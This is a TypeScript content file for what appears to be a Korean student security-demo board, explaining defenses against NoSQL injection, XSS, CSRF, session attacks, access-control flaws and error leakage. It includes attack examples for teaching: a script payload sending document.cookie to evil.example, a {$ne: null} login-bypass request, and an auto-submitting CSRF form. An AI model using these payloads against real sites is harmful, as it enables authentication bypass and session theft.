/** 소개 페이지(/)와 보안 상세 페이지(/security/[slug])가 함께 쓰는 발표용 콘텐츠. 실제 코드와 일치하도록 작성했다. */

export type Defense = {
  title: string;
  /** 해당 방어가 구현된 파일 */
  file: string;
  explain: string;
  code: string;
};

export type Topic = {
  slug: string;
  icon: string;
  title: string;
  /** 카드에 보이는 한 줄 요약 */
  summary: string;
  /** 담당 팀원 */
  owner: string;
  what: string[];
  attackTitle: string;
  attackSteps: string[];
  vulnerable: { caption: string; code: string };
  defenses: Defense[];
  /** 이 사이트의 어느 화면·기능에 적용됐는지 */
  applied: string[];
  demo: string[];
  demoCode?: { caption: string; code: string };
  limits: string;
};

export const TOPICS: Topic[] = [
  {
    slug: "injection",
    icon: "🧪",
    title: "입력값 검증 · 인젝션 방어",
    summary: "로그인 입력칸에 DB 연산자를 넣어 인증을 우회하는 NoSQL Injection 을 막습니다.",
    owner: "김명준 (로그인/세션)",
    what: [
      "인젝션은 사용자가 입력한 값이 ‘데이터’가 아니라 ‘명령’으로 해석되어 DB 질의가 바뀌는 공격입니다.",
      "SQL DB 에서는 ' OR '1'='1 같은 문자열이 쓰이고, 이 프로젝트가 쓰는 MongoDB 에서는 { \"$ne\": null } 같은 연산자 객체가 쓰입니다. 이를 NoSQL Injection 이라고 부릅니다.",
      "SQL 에서는 Prepared Statement(파라미터 바인딩)로 막고, MongoDB 에서는 ‘입력값 타입 강제 + 쿼리 연산자 무력화’로 같은 효과를 냅니다.",
    ],
    attackTitle: "공격은 이렇게 진행됩니다",
    attackSteps: [
      "공격자가 로그인 요청의 JSON 에서 아이디와 비밀번호를 문자열 대신 { \"$ne\": null } 로 바꿔 보냅니다.",
      "서버가 이 값을 그대로 쿼리에 넣으면 “아이디가 null 이 아닌 사용자” 조건이 되어 첫 번째 사용자로 매칭됩니다.",
      "비밀번호 조건도 같은 방식으로 항상 참이 되어, 비밀번호를 몰라도 로그인(관리자 계정 포함)에 성공합니다.",
    ],
    vulnerable: {
      caption: "취약한 코드 예시 (이 프로젝트의 코드가 아님)",
      code: `// body 를 검증 없이 그대로 쿼리에 사용
const user = await User.findOne({
  username: body.username,   // { "$ne": null } 이 들어오면 연산자로 해석됨
  password: body.password,
});`,
    },
    defenses: [
      {
        title: "1차 방어: 문자열 타입 강제",
        file: "src/lib/security/validate.ts",
        explain:
          "아이디·비밀번호·제목·내용 등 모든 입력은 쿼리에 닿기 전에 ‘문자열인지’ 검사합니다. 객체가 오면 400 으로 즉시 거절하므로 연산자가 쿼리에 들어갈 수 없습니다.",
        code: `export function requireString(value: unknown, label: string): string {
  if (typeof value !== "string") {
    throw new HttpError(400, \`\${label} 형식이 올바르지 않습니다.\`);
  }
  return value;
}`,
      },
      {
        title: "형식·길이 검증 (화이트리스트)",
        file: "src/lib/security/validate.ts",
        explain:
          "아이디는 영문 소문자·숫자·밑줄 4~20자만 허용하고, 비밀번호는 8~64자(영문+숫자 포함)로 제한합니다. 제목·내용·댓글도 글자 수 상한을 서버에서 검사합니다. 화면(클라이언트) 검사는 우회할 수 있으므로 서버가 최종 판단합니다.",
        code: `const USERNAME_RE = /^[a-z0-9_]+$/;
// 4~20자, 영문 소문자/숫자/밑줄만 허용
if (username.length < LIMITS.USERNAME_MIN ||
    username.length > LIMITS.USERNAME_MAX ||
    !USERNAME_RE.test(username)) { throw new HttpError(400, ...); }`,
      },
      {
        title: "2차 방어: Mongoose sanitizeFilter",
        file: "src/lib/db.ts",
        explain:
          "혹시 검증을 빠져나온 값이 있어도, 쿼리 조건에 섞인 $ 연산자를 ‘값’으로 바꿔 무력화합니다. 우리 코드가 일부러 쓰는 연산자만 trusted() 로 감싸 허용합니다. (SQL 의 Prepared Statement 와 같은 역할)",
        code: `mongoose.set("sanitizeFilter", true);
export const trusted = mongoose.trusted;
// 사용 예: expiresAt: trusted({ $gt: new Date() })`,
      },
      {
        title: "검색어 정규식 이스케이프",
        file: "src/lib/security/escape.ts",
        explain:
          "게시글 검색어를 정규식에 넣기 전에 정규식 특수문자를 이스케이프해, 정규식 인젝션과 과도한 연산(ReDoS)을 막습니다.",
        code: `export function escapeRegex(input: string): string {
  return input.replace(/[.*+?^\${}()|[\\]\\\\]/g, "\\\\$&");
}`,
      },
    ],
    applied: [
      "로그인 (/api/auth/login): 아이디·비밀번호가 문자열이 아니면 400",
      "회원가입 (/api/auth/register): 아이디 형식, 비밀번호 규칙 검사",
      "글쓰기·수정, 댓글 작성: 제목·내용 길이와 타입 검사",
      "게시글 검색: 검색어 길이 제한 + 정규식 이스케이프",
      "글·댓글 주소의 id 는 24자리 16진수(ObjectId) 형식인지 검사",
    ],
    demo: [
      "사이트 아무 페이지에서 개발자 도구(F12) → Console 을 엽니다.",
      "아래 코드를 붙여 넣어 실행합니다. 연산자 객체로 로그인을 시도하는 공격 요청입니다.",
      "응답이 400 “아이디 형식이 올바르지 않습니다.” 로 거절되면 방어 성공입니다. (방어가 없다면 로그인이 되어 버립니다)",
    ],
    demoCode: {
      caption: "Console 에 붙여 넣기",
      code: `fetch("/api/auth/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username: { $ne: null }, password: { $ne: null } }),
}).then(r => r.json().then(j => console.log(r.status, j)))`,
    },
    limits:
      "파일 업로드 기능이 없으므로 업로드 관련 공격 면 자체가 없습니다. (첨부파일 검증은 구현 범위에 포함하지 않았습니다.)",
  },
  {
    slug: "xss",
    icon: "🧼",
    title: "XSS 방어",
    summary: "게시글·댓글에 심은 <script> 가 다른 사용자의 브라우저에서 실행되지 않게 막습니다.",
    owner: "정용훈 (게시글/댓글)",
    what: [
      "XSS(Cross-Site Scripting)는 공격자가 게시글·댓글에 악성 스크립트를 심어, 그 글을 보는 다른 사용자의 브라우저에서 실행시키는 공격입니다.",
      "스크립트가 실행되면 쿠키·세션 탈취, 가짜 로그인창 표시, 사용자 대신 요청 전송 등이 가능합니다.",
      "게시판처럼 사용자가 쓴 글을 다른 사용자에게 보여 주는 서비스에서 가장 흔한 취약점입니다.",
    ],
    attackTitle: "공격은 이렇게 진행됩니다",
    attackSteps: [
      "공격자가 댓글에 <script>fetch('https://evil.example/?c='+document.cookie)</script> 를 작성합니다.",
      "서버가 이 문자열을 그대로 저장하고, 화면에 HTML 로 출력합니다.",
      "다른 사용자가 글을 열면 브라우저가 이를 스크립트로 실행하고, 공격자 서버로 쿠키가 전송됩니다.",
    ],
    vulnerable: {
      caption: "취약한 코드 예시 (이 프로젝트의 코드가 아님)",
      code: `// 저장된 값을 HTML 그대로 화면에 삽입
<div dangerouslySetInnerHTML={{ __html: post.content }} />`,
    },
    defenses: [
      {
        title: "1단계: 저장할 때 특수문자 치환",
        file: "src/lib/security/escape.ts",
        explain:
          "글·댓글을 저장하기 전에 & < > \" ' 를 HTML 엔티티(&lt; 등)로 바꿉니다. 이렇게 저장하면 <script> 는 ‘태그’가 아니라 ‘글자’로만 취급됩니다.",
        code: `const ESCAPE_MAP = {
  "&": "&amp;", "<": "&lt;", ">": "&gt;",
  '"': "&quot;", "'": "&#39;",
};
export function escapeHtml(input: string): string {
  return input.replace(/[&<>"']/g, (ch) => ESCAPE_MAP[ch]);
}`,
      },
      {
        title: "2단계: 출력은 React 텍스트로만",
        file: "src/app/posts/[id]/page.tsx",
        explain:
          "화면에 보여 줄 때는 원래 글자로 되돌린 값을 React 의 텍스트 노드({값})로만 출력합니다. React 가 출력 시점에 한 번 더 이스케이프하고, dangerouslySetInnerHTML 은 프로젝트 전체에서 사용하지 않습니다.",
        code: `<h1>{unescapeHtml(post.title)}</h1>
<div className="post-content">{unescapeHtml(post.content)}</div>`,
      },
      {
        title: "3단계: CSP(Content-Security-Policy) 헤더",
        file: "src/proxy.ts",
        explain:
          "요청마다 무작위 nonce 를 만들어, nonce 가 붙은 스크립트만 실행하도록 브라우저에 지시합니다. 혹시 스크립트가 HTML 에 섞여 들어가도 nonce 가 없으므로 실행되지 않습니다. object-src 'none', frame-ancestors 'none' 도 함께 적용합니다.",
        code: `const nonce = btoa(crypto.randomUUID());
const csp = [
  "default-src 'self'",
  \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic'\`,
  "object-src 'none'", "base-uri 'self'",
  "frame-ancestors 'none'",
].join("; ");`,
      },
    ],
    applied: [
      "게시글 제목·내용: 저장 시 치환, 목록·상세 화면은 React 텍스트로 출력",
      "댓글 내용: 같은 방식으로 처리",
      "검색어: 서버에서 처리하며 화면에 그대로 HTML 로 넣지 않음",
      "모든 페이지 응답에 CSP 헤더(nonce) 적용",
    ],
    demo: [
      "로그인한 뒤 글쓰기에서 제목에 XSS 테스트, 내용에 <script>alert('XSS')</script> 를 입력하고 저장합니다.",
      "글 상세 화면에서 팝업이 뜨지 않고, 입력한 코드가 글자 그대로 보이면 방어 성공입니다.",
      "개발자 도구 → Network → 첫 번째 요청의 Response Headers 에서 Content-Security-Policy 를 보여 줍니다.",
    ],
    limits:
      "허용 태그만 남기는 방식(HTML 허용)은 쓰지 않고, 모든 태그를 글자로 바꾸는 가장 엄격한 방식을 선택했습니다. 그래서 글에 굵은 글씨 같은 서식은 쓸 수 없습니다.",
  },
  {
    slug: "csrf",
    icon: "🎫",
    title: "CSRF 방어",
    summary: "로그인한 사용자를 속여 원치 않는 글 삭제·작성 요청을 보내게 하는 공격을 막습니다.",
    owner: "조서원 (비밀글/삭제)",
    what: [
      "CSRF(Cross-Site Request Forgery)는 로그인된 사용자의 브라우저가 쿠키를 자동으로 보내는 성질을 악용해, 사용자가 의도하지 않은 요청을 서버에 보내게 만드는 공격입니다.",
      "공격자는 비밀번호를 몰라도 됩니다. 피해자가 로그인된 상태로 악성 페이지를 열기만 하면 요청이 전송됩니다.",
    ],
    attackTitle: "공격은 이렇게 진행됩니다",
    attackSteps: [
      "피해자가 세이프보드에 로그인한 상태에서, 공격자가 만든 다른 사이트를 방문합니다.",
      "그 사이트가 숨겨진 폼이나 스크립트로 세이프보드의 글 삭제 요청을 자동 전송합니다.",
      "브라우저가 세션 쿠키를 자동으로 붙여 보내므로, 방어가 없으면 서버는 정상 요청으로 알고 글을 삭제합니다.",
    ],
    vulnerable: {
      caption: "공격 페이지 예시 (공격자 사이트)",
      code: `<form action="https://safeboard.example/api/posts/123" method="POST">
</form>
<script>document.forms[0].submit()</script>`,
    },
    defenses: [
      {
        title: "CSRF 토큰 검증 (Synchronizer Token)",
        file: "src/lib/security/csrf.ts",
        explain:
          "로그인할 때 세션마다 무작위 토큰을 만들어 서버 세션에 저장합니다. 글쓰기·수정·삭제·댓글 같은 변경 요청은 x-csrf-token 헤더의 값이 세션 토큰과 같을 때만 처리합니다. 다른 사이트는 이 토큰을 알 수 없어 403 으로 막힙니다. 비교에는 timing-safe 함수를 사용합니다.",
        code: `const sent = req.headers.get("x-csrf-token");
if (!sent || !safeEqual(sent, sessionCsrfToken)) {
  throw new HttpError(403, "잘못된 요청입니다. (CSRF 토큰 불일치)");
}`,
      },
      {
        title: "Origin 헤더 확인 (보조 방어)",
        file: "src/lib/security/csrf.ts",
        explain:
          "요청의 Origin 이 우리 사이트의 주소와 다르면 토큰을 보기 전에 거절합니다.",
        code: `if (originHost !== req.headers.get("host")) {
  throw new HttpError(403, "허용되지 않은 출처의 요청입니다.");
}`,
      },
      {
        title: "세션 쿠키 SameSite 속성",
        file: "src/lib/auth/session.ts",
        explain:
          "SameSite=Lax 로 설정하면 다른 사이트에서 보낸 POST 요청에는 세션 쿠키가 실리지 않습니다. 토큰 검증과 함께 이중으로 막습니다.",
        code: `{
  httpOnly: true,
  sameSite: "lax",
  secure: process.env.COOKIE_SECURE === "true",
  path: "/",
}`,
      },
      {
        title: "변경 요청 API 에 일괄 적용",
        file: "src/lib/auth/session.ts",
        explain:
          "로그인 확인과 CSRF 검증을 한 함수로 묶어, 글 작성·수정·삭제와 댓글 작성·삭제 API 가 모두 이 함수를 통과해야만 동작합니다.",
        code: `export async function requireSessionWithCsrf(req: Request) {
  const session = await requireSession();   // 로그인 확인 (없으면 401)
  verifyCsrf(req, session.csrfToken);       // 토큰·출처 확인 (불일치면 403)
  return session;
}`,
      },
    ],
    applied: [
      "글 작성 (POST /api/posts)",
      "글 수정·삭제 (PUT·DELETE /api/posts/[id])",
      "댓글 작성·삭제",
      "세션 쿠키 전체 (SameSite=Lax)",
    ],
    demo: [
      "로그인한 상태에서 개발자 도구 Console 을 엽니다.",
      "아래 코드는 CSRF 토큰 없이 글쓰기를 요청하는, 공격 사이트가 보내는 요청과 같은 상황입니다.",
      "응답이 403 “CSRF 토큰 불일치” 이면 방어 성공입니다. (정상적으로 화면에서 글을 쓰면 토큰이 자동으로 붙어 성공합니다)",
    ],
    demoCode: {
      caption: "로그인한 상태에서 Console 에 붙여 넣기",
      code: `fetch("/api/posts", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ title: "위조 요청", content: "토큰 없음" }),
}).then(r => r.json().then(j => console.log(r.status, j)))`,
    },
    limits:
      "비밀번호 변경 기능은 이 프로젝트 범위에 없어서 구현하지 않았습니다. 글·댓글 작성·삭제에 같은 방식이 적용되어 있습니다.",
  },
  {
    slug: "auth",
    icon: "🔑",
    title: "비밀번호 해시 · 안전한 세션",
    summary: "비밀번호는 bcrypt 해시로만 저장하고, 세션 쿠키·세션 ID 를 안전하게 관리합니다.",
    owner: "김명준 (로그인/세션)",
    what: [
      "비밀번호를 평문으로 저장하면 DB 가 유출되는 순간 모든 계정이 노출됩니다. 해시 함수에 솔트를 적용해 저장하면 원래 비밀번호를 알아내기 어렵습니다.",
      "세션 관리가 허술하면 쿠키 탈취(XSS), 세션 고정(Session Fixation), 무차별 대입 공격으로 계정이 넘어갑니다.",
    ],
    attackTitle: "공격은 이렇게 진행됩니다",
    attackSteps: [
      "DB 유출: 평문 또는 약한 해시로 저장된 비밀번호를 그대로 사용하거나 쉽게 복구합니다.",
      "세션 고정: 공격자가 미리 알고 있는 세션 ID 를 피해자에게 쓰게 한 뒤, 로그인 후 같은 ID 로 접속합니다.",
      "무차별 대입: 한 아이디에 비밀번호를 계속 바꿔 가며 시도합니다.",
    ],
    vulnerable: {
      caption: "취약한 코드 예시 (이 프로젝트의 코드가 아님)",
      code: `await User.create({ username, password });          // 평문 저장
res.cookie("sid", sid);                              // HttpOnly 없음, 로그인 때 재발급 안 함`,
    },
    defenses: [
      {
        title: "bcrypt 해시 + 자동 솔트 (cost 12)",
        file: "src/lib/auth/password.ts",
        explain:
          "평문 비밀번호는 저장하지 않고 bcrypt 해시만 저장합니다. 솔트가 해시에 자동 포함되어 같은 비밀번호도 서로 다른 해시가 됩니다. cost 12 는 2^12 번 반복 연산이라 무차별 대입 비용을 크게 높입니다. 해시는 기본 조회에서 제외(select: false)해 실수로 노출되지 않게 했습니다.",
        code: `const BCRYPT_COST = 12;
export const hashPassword = (plain: string) => bcrypt.hash(plain, BCRYPT_COST);
export const verifyPassword = (plain: string, hash: string) => bcrypt.compare(plain, hash);`,
      },
      {
        title: "로그인 시 세션 ID 재발급",
        file: "src/lib/auth/session.ts",
        explain:
          "로그인에 성공할 때마다 기존 세션을 폐기하고 새 토큰을 발급합니다. 로그인 전에 심어 둔 세션 ID 를 쓰는 세션 고정 공격을 막습니다.",
        code: `// 기존 세션이 있으면 삭제
await Session.deleteOne({ tokenHash: sha256(oldToken) });
// 32바이트 무작위 새 토큰 발급
const token = randomBytes(32).toString("hex");`,
      },
      {
        title: "토큰 해시만 DB 저장 + 2시간 만료",
        file: "src/lib/auth/session.ts, src/lib/models/Session.ts",
        explain:
          "서버에는 세션 토큰의 SHA-256 해시만 저장해서 DB 가 유출돼도 세션을 훔쳐 쓸 수 없습니다. 세션은 2시간 뒤 만료되고, MongoDB TTL 인덱스가 만료된 세션을 자동 삭제합니다.",
        code: `const SESSION_TTL_MS = 2 * 60 * 60 * 1000; // 2시간
await Session.create({ tokenHash: sha256(token), user: userId,
  csrfToken: generateCsrfToken(), expiresAt });`,
      },
      {
        title: "쿠키 속성: HttpOnly · SameSite · Secure",
        file: "src/lib/auth/session.ts",
        explain:
          "HttpOnly 로 JavaScript(document.cookie)가 세션 쿠키를 읽지 못하게 해 XSS 로 인한 탈취를 막습니다. Secure 는 HTTPS 에서만 전송하게 하며, 배포 환경에서 COOKIE_SECURE=true 로 켭니다. (로컬 http 에서는 꺼 둠)",
        code: `{ httpOnly: true, sameSite: "lax",
  secure: process.env.COOKIE_SECURE === "true" }`,
      },
      {
        title: "무차별 대입 차단 + 계정 존재 여부 숨김",
        file: "src/lib/auth/rateLimit.ts, src/app/api/auth/login/route.ts",
        explain:
          "아이디당 5회 연속 실패하면 5분간 로그인을 막습니다. 실패 응답은 아이디 존재 여부와 관계없이 같은 문구이고, 없는 아이디도 bcrypt 비교를 똑같이 수행해 응답 시간으로 가입 여부를 추측하지 못하게 했습니다.",
        code: `export const MAX_FAILURES = 5;
export const LOCK_MS = 5 * 60 * 1000;
const ok = await verifyPassword(password, user?.passwordHash ?? DUMMY_HASH);`,
      },
    ],
    applied: [
      "회원가입: 비밀번호 규칙 검사 후 bcrypt 해시만 저장",
      "로그인: 5회 실패 잠금, 성공 시 세션 재발급",
      "로그아웃: 서버 세션 삭제 + 쿠키 삭제",
      "모든 페이지: 세션 만료 검사 (2시간)",
    ],
    demo: [
      "로그인 후 개발자 도구 → Application → Cookies 에서 sb_session 쿠키의 HttpOnly 에 체크된 것을 보여 줍니다.",
      "Console 에 document.cookie 를 입력해도 sb_session 이 출력되지 않는 것을 보여 줍니다.",
      "없는 아이디로 비밀번호를 5번 틀리게 입력하면 5분 잠금 안내가 나오는 것을 보여 줍니다.",
      "MongoDB Atlas 의 users 컬렉션에서 passwordHash 가 $2a$12$... 형태의 해시인 것을 보여 줍니다.",
    ],
    limits:
      "해시 알고리즘은 bcrypt 를 사용했습니다. (Argon2 는 사용하지 않음) Secure 쿠키는 HTTPS 로 배포할 때 켜는 설정입니다.",
  },
  {
    slug: "access-control",
    icon: "🚧",
    title: "접근 제어(권한 검사)",
    summary: "본인 글만 수정·삭제하고, 비밀글은 권한이 있는 사람에게만 내용을 내려 보냅니다.",
    owner: "조서원 (비밀글/삭제)",
    what: [
      "접근 제어는 ‘이 사용자가 이 동작을 해도 되는가’를 서버가 매번 확인하는 것입니다.",
      "화면에서 버튼을 숨기는 것만으로는 부족합니다. 공격자는 화면을 거치지 않고 API 주소로 직접 요청을 보낼 수 있기 때문에 반드시 서버에서 확인해야 합니다.",
    ],
    attackTitle: "공격은 이렇게 진행됩니다",
    attackSteps: [
      "다른 사람의 글 번호(id)를 알아낸 뒤 수정·삭제 요청을 직접 보냅니다. (IDOR / 권한 상승)",
      "비밀글의 주소를 추측하거나 검색으로 제목·내용을 훔쳐봅니다.",
      "로그인하지 않은 상태로 게시판 내용을 크롤링합니다.",
    ],
    vulnerable: {
      caption: "취약한 코드 예시 (이 프로젝트의 코드가 아님)",
      code: `// 로그인만 확인하고 글 주인인지는 확인하지 않음
await Post.deleteOne({ _id: id });`,
    },
    defenses: [
      {
        title: "작성자 본인 확인 (수정·삭제)",
        file: "src/lib/services/posts.ts",
        explain:
          "세션의 사용자 ID 와 DB 에 저장된 글 작성자 ID 가 같을 때만 수정·삭제합니다. 다르면 403 입니다. 댓글 삭제도 같은 방식입니다. 글을 지우면 딸린 댓글도 함께 삭제합니다.",
        code: `if (String(post.author) !== user.id)
  throw new HttpError(403, "작성자 본인만 삭제할 수 있습니다.");
await Post.deleteOne({ _id: id });
await Comment.deleteMany({ post: id });`,
      },
      {
        title: "비밀글 열람 제한 (서버가 내용을 아예 보내지 않음)",
        file: "src/lib/services/posts.ts",
        explain:
          "비밀글은 작성자 본인과 관리자만 볼 수 있습니다. 권한이 없으면 제목과 내용 자체를 응답에서 비워서, 화면에서 숨기는 것이 아니라 서버가 보내지 않습니다. 비밀글에는 댓글도 달 수 없습니다.",
        code: `function canView(post, viewer) {
  if (!post.isSecret) return true;
  if (!viewer) return false;
  return viewer.role === "admin" || String(post.author) === viewer.id;
}`,
      },
      {
        title: "검색으로 비밀글이 새지 않게",
        file: "src/lib/services/posts.ts",
        explain:
          "검색 결과에서도 볼 수 없는 비밀글은 대상에서 제외해서, 검색어로 비밀글의 존재나 내용을 추측할 수 없습니다.",
        code: `if (viewer?.role !== "admin") {
  clauses.push(viewer ? { $or: [{ isSecret: false }, { author: viewer.id }] }
                      : { isSecret: false });
}`,
      },
      {
        title: "로그인한 사용자만 게시판 열람",
        file: "src/app/page.tsx, src/app/api/posts/route.ts",
        explain:
          "로그인하지 않으면 게시판 화면에서는 소개 페이지만, 글 상세는 로그인 화면으로, 글 목록·상세 API 는 401 로 응답합니다.",
        code: `// 글 목록·상세 API
const session = await requireSession(); // 비로그인 → 401`,
      },
    ],
    applied: [
      "글 수정·삭제: 작성자 본인만 (버튼도 본인 글에만 표시, 서버에서도 재확인)",
      "비밀글: 목록에는 잠금 표시, 상세는 작성자·관리자만 내용 확인",
      "글 목록·상세 조회: 로그인 필수",
      "관리자(admin) 계정은 비밀글 열람 가능",
    ],
    demo: [
      "student1 로 로그인해 다른 사용자(admin)가 쓴 글을 열면 수정·삭제 버튼이 보이지 않습니다.",
      "admin 이 쓴 비밀글을 student1 로 열면 “비밀글입니다” 화면만 나오고 내용은 내려오지 않습니다.",
      "로그아웃한 상태에서 글 주소를 직접 입력하면 로그인 화면으로 이동합니다.",
    ],
    limits:
      "관리자는 비밀글을 볼 수 있지만, 다른 사람의 글을 수정·삭제하는 권한은 주지 않았습니다.",
  },
  {
    slug: "error-headers",
    icon: "🙈",
    title: "오류 정보 숨김 · 보안 헤더",
    summary: "오류 화면에 내부 정보를 노출하지 않고, 브라우저 보안 헤더로 공격 면을 줄입니다.",
    owner: "공통 (3인)",
    what: [
      "오류 메시지에 DB 주소, 쿼리, 스택트레이스가 보이면 공격자가 서버 구조를 파악하는 단서가 됩니다.",
      "보안 헤더는 브라우저에게 ‘이 페이지는 이렇게만 동작해라’ 라고 지시해 클릭재킹, MIME 스니핑 같은 공격을 줄입니다.",
    ],
    attackTitle: "공격은 이렇게 진행됩니다",
    attackSteps: [
      "일부러 잘못된 요청을 보내 서버 오류를 일으킨 뒤 오류 메시지에서 DB 종류·주소·파일 경로를 수집합니다.",
      "투명한 iframe 안에 사이트를 넣고 버튼 위에 가짜 화면을 겹쳐 클릭을 유도합니다. (클릭재킹)",
    ],
    vulnerable: {
      caption: "취약한 코드 예시 (이 프로젝트의 코드가 아님)",
      code: `catch (err) {
  return res.status(500).json({ error: err.stack });  // 내부 정보 그대로 노출
}`,
    },
    defenses: [
      {
        title: "모든 API 의 오류 처리 통일",
        file: "src/lib/api.ts",
        explain:
          "모든 API 를 handle() 로 감쌉니다. 우리가 의도적으로 던진 오류(HttpError)만 메시지를 보여 주고, 그 밖의 예외(DB 오류, 코드 버그)는 상세 내용을 서버 콘솔에만 기록하고 사용자에게는 일반 문구만 줍니다.",
        code: `console.error("[API ERROR]", req.method, pathname, err); // 서버 로그에만
return json({ error: "서버 오류가 발생했습니다. 잠시 후 다시 시도해 주세요." }, 500);`,
      },
      {
        title: "화면 오류 페이지",
        file: "src/app/error.tsx, src/app/global-error.tsx",
        explain: "화면에서 오류가 나도 error.message 를 출력하지 않고 일반 안내만 보여 줍니다.",
        code: `export default function ErrorPage({ reset }) {
  // error.message 를 일부러 출력하지 않는다
  return <p>서버 오류가 발생했습니다.</p>;
}`,
      },
      {
        title: "보안 응답 헤더",
        file: "next.config.ts, src/proxy.ts",
        explain:
          "X-Content-Type-Options: nosniff, X-Frame-Options: DENY(클릭재킹 방지), Referrer-Policy, Permissions-Policy 를 모든 응답에 붙입니다. X-Powered-By 헤더는 제거해 사용 기술 노출을 줄였습니다.",
        code: `poweredByHeader: false,
headers: [
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
]`,
      },
    ],
    applied: [
      "모든 API 응답 (오류 시 일반 문구)",
      "모든 화면 (오류 페이지, 404 페이지)",
      "모든 페이지 응답 헤더",
    ],
    demo: [
      "개발자 도구 → Network → 페이지 요청 → Response Headers 에서 보안 헤더들을 보여 줍니다. (X-Powered-By 는 없음)",
      "존재하지 않는 글 주소로 들어가면 내부 정보 없이 안내 화면만 나오는 것을 보여 줍니다.",
    ],
    limits:
      "실제 서비스에서는 HTTPS 와 HSTS 설정을 더해야 합니다. 이 프로젝트는 로컬 시연 환경이라 포함하지 않았습니다.",
  },
];

export const TOPIC_MAP = new Map(TOPICS.map((t) => [t.slug, t]));
